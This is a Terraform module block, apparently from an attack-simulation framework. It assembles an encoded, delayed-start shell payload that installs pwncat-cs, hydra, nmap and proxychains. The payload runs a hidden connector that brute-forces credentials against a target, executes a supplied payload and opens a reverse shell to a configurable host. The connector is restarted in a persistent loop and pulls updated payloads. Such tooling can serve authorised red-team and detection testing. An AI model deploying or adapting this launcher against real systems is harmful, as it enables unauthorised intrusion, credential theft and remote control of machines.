locals {
    attack_dir = "/pwncat_connector"
    payload = <<-EOT
    PWNCAT_LOG="/tmp/pwncat_connector.log"
    PWNCAT_SESSION="pwncat_connector"
    PWNCAT_SESSION_LOCK="/tmp/pwncat_connector_session.lock"
    if [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; then
        log "Pwncat session lock $PWNCAT_SESSION_LOCK exists and $PWNCAT_SESSION screen session running. Skipping setup."
    else
        rm -f "$PWNCAT_SESSION_LOCK"
        log "Session lock doesn't exist and screen session not runing. Continuing..."
        screen -S $PWNCAT_SESSION -X quit
        screen -wipe
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
        cd ${local.attack_dir}
        echo ${base64gzip(local.connector)} | base64 -d | gunzip > connector.py
        echo ${base64gzip(local.scan)} | base64 -d | gunzip > scan.sh
        log "installing required python3.9..."
        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
        python3.9 get-pip.py >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        python3.9 -m pip install -U pip "packaging>=24" "ordered-set>=3.1.1" "more_itertools>=8.8" "jaraco.text>=3.7" "importlib_resources>=5.10.2" "importlib_metadata>=6" "tomli>=2.0.1" "wheel>=0.43.0" "platformdirs>=2.6.2" setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        log "checking for user and password list before starting..."
        while ! [ -f "${var.inputs["user_list"]}" ] || ! [ -f "${var.inputs["password_list"]}" ]; do
            log "waiting for ${var.inputs["user_list"]} and ${var.inputs["password_list"]}..."
            sleep 30
        done
        START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        while true; do
            for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
            mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
            log "starting background process via screen..."
            screen -S $PWNCAT_SESSION -X quit
            screen -wipe
            screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m /bin/bash -c "cd ${local.attack_dir} && python3.9 connector.py --target-ip=\"${var.inputs["target_ip"]}\" --target-port=\"${var.inputs["target_port"]}\" --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\" --payload=\"${base64encode(var.inputs["payload"])}\" --reverse-shell-host=\"${var.inputs["reverse_shell_host"]}\"  --reverse-shell-port=\"${var.inputs["reverse_shell_port"]}\""
            screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
            log "connector started."
            log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
            sleep 1800
            log "sleep complete - checking for running sessions..."
            while [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; do
                log "pwncat session still running - waiting before restart..."
                sleep 600
            done
            log "no pwncat sessions found - continuing..."
            if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
                log "payload update detected - exiting loop and forcing payload download"
                rm -f /tmp/payload_$SCRIPTNAME
                break
            else
                log "restarting loop..."
            fi
        done
    fi
    log "done."
    EOT

    connector        = file(
                                "${path.module}/resources/connector.py", 
                            )
    
    scan            = file(
                                "${path.module}/resources/scan.sh", 
                            )
    
    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = "proxychains4 nmap hydra python3-pip"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
            yum update -y
            yum install -y git
            yum groupinstall -y 'Development Tools'
            # proxychains4
            cd /usr/local/src
            git clone https://github.com/rofl0r/proxychains-ng
            cd proxychains-ng
            ./configure && make && make install
            make install-config
            # hydra
            cd /usr/local/src
            git clone https://github.com/vanhauser-thc/thc-hydra
            cd thc-hydra
            ./configure && make && make install
        fi
        EOT
        yum_packages = "nmap python3-pip"
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = [
            {
                name = "${basename(abspath(path.module))}_scan.sh"
                content = base64encode(local.scan)
            },
        ]
    }
}